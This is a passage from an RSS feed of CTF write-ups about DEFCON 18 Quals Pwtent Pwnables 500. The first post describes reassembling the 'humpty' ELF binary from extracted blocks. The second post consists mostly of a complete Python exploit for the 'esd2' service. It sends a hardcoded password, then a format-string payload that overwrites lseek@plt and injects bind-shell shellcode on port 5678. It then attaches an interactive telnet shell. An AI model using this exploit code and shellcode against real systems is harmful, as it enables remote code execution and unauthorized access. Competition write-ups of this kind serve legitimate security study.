<p>The task now is to merge all the blocks in a the right order to rebuild the ELF binary. What I did was to get a sample freebsd binary which has similar size as humpty, then used `split -b512` to split it to 21 chunks of 512 bytes and then compared side by side with the 21 extracted blocks from ddtek’s pp500 server, merged it manually and used readelf to verify the merged binary. <a href="http://force.vnsecurity.net/download/humpty">Here</a> (or <a href="http://ddtek.biz/pp500">here</a>) is the binary for pp500′s humpty.</p>

<p>After getting the binary, the rest of the tasks are easy since ddtek gave us out the exploit from the pcap dump. The exploit is similar to <a href="/2010/05/defcon-18-quals-pwtent-pwnables-500-exploit/">the exploit of esd2</a>. FYI, esd2 is the original binary for pp500 which was leaked out via pp200 shell. After ddtek guys realized of this problem, they modified the esd2, changed password, strings, commands, read elf block functions, xor input, .. and named it humpty.</p>


  ]]></description>
</item>

	<item>
  <title>DEFCON 18 Quals: Pwtent Pwnables 500 esd2 exploit</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/05/28/defcon-18-quals-pwtent-pwnables-500-exploit.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-05-28T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/05/28/defcon-18-quals-pwtent-pwnables-500-exploit.html</guid>
  <description><![CDATA[
     <p>CLGT did not solved this during the quals! Here is the exploit for  the **esd2 **<a href="http://beist.org/esd2">leaked</a> from pp200 (thanks beist for sharing). More analysis &amp; write up for the real pp500 will come later:</p>

<pre class="brush: python; title: ; notranslate" title="">#!/usr/bin/env python

import socket
import struct
import telnetlib
import time

HOST = '192.168.56.101'
PORT = 8302

def xor_input(data):
    static = "%5d | %5dn" + "x00"*4
    out = ""
    for i in range(len(data)):
        out += chr(ord(static[i]) ^ ord(data[i]))
    return out

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# send password
s.send("sp3wn0w" + "n")

# prepare the payload
# overwrite lseek@plt, original value = 0x08048ae2
target = 0x804a30c
# shellcode address = 0x0804a040 + 142 bytes (padding + fmt_string)
ret = 0x0804a0ce
# value to write into target
write_byte = 0xa0ce
# payload = target + padding(128 - 4) + 14 (fmt_string) + shellcode
padding = "A"*128
fmt_string = "%" + str(write_byte) + "u%24$hn"
fmt_string = xor_input(fmt_string)

# bindshell: port 5678
shellcode = "x00x29xc9x83xe9xecxd9xeexd9x74x24xf4x5bx81x73x13x63x7dxa9x09x83xebxfcxe2xf4x09x1cxf1x90x31x15xb9x0bx75x53x20xe8x31x3fxfbx4bx31x17xb9xc4xe3xe4x3ax58x30x2fxc3x61x3bxb0x29xb9x09xb0x29x5bx30x2fx19x17xaexfdx3ex63x61x24xc3x53x3bx2cxfex58xaexfdxe0x70x96x2dxc1x26x4cx0exc1x61x4cx1fxc0x67xeax9exf9x5dx30x2ex19x32xaexfdxa9x09"

payload = struct.pack("&lt;L", target) + padding[4:] + fmt_string + shellcode + "n"

print "Sending payload...", repr(payload)
s.send("cn" + str(len(payload)) +"n")
s.send(payload)
# trigger the read_blob that calls lseek()
s.send("rn" + "10n")

print "Connecting to remote shell port 5678..."
time.sleep(4)
t = telnetlib.Telnet(HOST, 5678)
t.write("idnn")
t.interact()

t.close()
s.close()
</pre>


  ]]></description>
</item>

</channel>
</rss>